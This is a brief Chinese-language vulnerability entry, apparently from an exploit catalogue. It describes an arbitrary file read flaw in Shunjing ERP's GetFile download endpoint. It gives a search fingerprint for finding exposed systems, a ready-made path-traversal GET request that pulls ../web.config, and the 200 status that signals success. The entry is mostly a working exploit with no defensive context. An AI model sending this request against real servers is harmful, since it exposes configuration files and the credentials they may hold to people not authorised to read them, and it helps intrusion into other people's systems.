# 顺景ERPGetFile任意文件读取漏洞

顺景ERPGetFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="api/DBRecord/getDBRecords"`
- **请求**：`GET /api/Download/GetFile?FileName=../web.config&Title=123 HTTP/1.1`
- **响应特征**：200